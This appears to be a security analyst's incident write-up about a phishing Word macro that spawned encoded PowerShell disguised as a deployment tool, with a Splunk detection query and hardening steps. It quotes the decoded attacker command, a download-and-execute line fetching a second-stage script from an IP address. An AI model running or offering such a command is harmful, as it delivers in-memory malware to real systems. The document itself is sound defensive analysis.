# Case #17: The PowerShell Breadcrumb

**Difficulty:** 🔴 Advanced &nbsp;|&nbsp; **Status:** 🟢 Resolved &nbsp;|&nbsp; **Time to Resolution:** ~3 days

## 🚨 Scenario Overview
A PowerShell execution alert fired with flags matching the company's standard software-deployment
tool almost exactly — close enough that the first reviewer nearly closed it as routine.

## 🕵️ First Theory — Routine Deployment
The command-line arguments matched the deployment tool's known pattern closely enough to log it as
benign and move on.

## 🔦 The Detail That Broke It
```spl
index=sysmon EventCode=1 parent_process="*"
| search process="powershell.exe"
| table _time, parent_process, CommandLine
```

The parent process wasn't the deployment agent at all — it was `WINWORD.EXE`. Word doesn't launch
PowerShell as part of any legitimate deployment workflow, ever.

## 🔎 The Real Investigation
```bash
$ powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATw...
# decoded:
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/stage2.ps1')
```

A phishing document's macro had launched PowerShell with a base64-encoded command deliberately
styled to resemble the deployment tool's flags — camouflage, not coincidence. The decoded command
downloaded and executed a second-stage payload **entirely in memory**, then created a scheduled
task for persistence.

## 🛠️ Mitigation & Hardening
* Enabled Attack Surface Reduction rules blocking Office applications from spawning child processes
  like PowerShell.
* Enforced PowerShell Constrained Language Mode and required script signing.
* Removed the scheduled-task persistence and rebuilt the affected endpoint.
* Added an alert specifically for Office-application-to-PowerShell parent/child relationships.

## 📂 Repository Artifacts
* `queries.spl` — Splunk query flagging Office processes spawning PowerShell.

## 📝 Case Notes
The attacker didn't hide the command — they disguised it to look like something we already trusted.
Matching a known-good pattern isn't the same as verifying the process ancestry actually producing it.
